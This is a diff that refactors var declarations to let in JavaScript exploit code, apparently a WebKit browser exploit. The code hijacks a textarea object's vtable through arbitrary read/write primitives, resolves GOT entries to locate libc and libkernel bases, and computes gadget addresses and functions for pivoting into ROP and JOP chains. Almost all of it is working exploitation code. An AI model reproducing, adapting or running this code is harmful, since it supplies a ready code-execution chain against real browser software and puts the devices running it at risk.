@@ -1,50 +1,50 @@
 var tarea = document.createElement('textarea');
 
-var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
-var fake_vt_ptr = malloc(0x400);
+let real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
+let fake_vt_ptr = malloc(0x400);
 write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
 write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
 
-var real_vtable = read_ptr_at(fake_vt_ptr);
-var fake_vtable = malloc(0x2000);
+let real_vtable = read_ptr_at(fake_vt_ptr);
+let fake_vtable = malloc(0x2000);
 write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
 write_ptr_at(fake_vt_ptr, fake_vtable);
 
-var fake_vt_ptr_bak = malloc(0x400);
+let fake_vt_ptr_bak = malloc(0x400);
 write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
 
-var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
+let plt_ptr = read_ptr_at(fake_vtable) - 10063176;
 
 function get_got_addr(idx)
 {
-    var p = plt_ptr + idx * 16;
-    var q = read_mem(p, 6);
+    let p = plt_ptr + idx * 16;
+    let q = read_mem(p, 6);
     if(q[0] != 0xff || q[1] != 0x25)
         throw "invalid GOT entry";
-    var offset = 0;
-    for(var i = 5; i >= 2; i--)
+    let offset = 0;
+    for(let i = 5; i >= 2; i--)
         offset = offset * 256 + q[i];
     offset += p + 6;
     return read_ptr_at(offset);
 }
 
 //these are not real bases but rather some low addresses
-var webkit_base = read_ptr_at(fake_vtable);
-var libkernel_base = get_got_addr(705)-0x10000;
-var libc_base = get_got_addr(582);
-var saveall_addr = libc_base+0x2e2c8;
-var loadall_addr = libc_base+0x3275c;
-var setjmp_addr = libc_base+0xbfae0;
-var longjmp_addr = libc_base+0xbfb30;
-var pivot_addr = libc_base+0x327d2;
-var infloop_addr = libc_base+0x447a0;
-var jop_frame_addr = libc_base+0x715d0;
-var get_errno_addr_addr = libkernel_base+0x9ff0;
-var pthread_create_addr = libkernel_base+0xf980;
+let webkit_base = read_ptr_at(fake_vtable);
+let libkernel_base = get_got_addr(705)-0x10000;
+let libc_base = get_got_addr(582);
+let saveall_addr = libc_base+0x2e2c8;
+let loadall_addr = libc_base+0x3275c;
+let setjmp_addr = libc_base+0xbfae0;
+let longjmp_addr = libc_base+0xbfb30;
+let pivot_addr = libc_base+0x327d2;
+let infloop_addr = libc_base+0x447a0;
+let jop_frame_addr = libc_base+0x715d0;
+let get_errno_addr_addr = libkernel_base+0x9ff0;
+let pthread_create_addr = libkernel_base+0xf980;
 
 function saveall()
 {
-    var ans = malloc(0x800);
+    let ans = malloc(0x800);
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
     tarea.scrollLeft = 0;
@@ -68,7 +68,7 @@ This function is used to execute ROP chains. `buf` is an address of the start of
 */
 function pivot(buf)
 {
-    var ans = malloc(0x400);
+    let ans = malloc(0x400);
     var bak = read_ptr_at(fake_vtable+0x1d8);
     write_ptr_at(fake_vtable+0x1d8, saveall_addr);
     tarea.scrollLeft = 0;
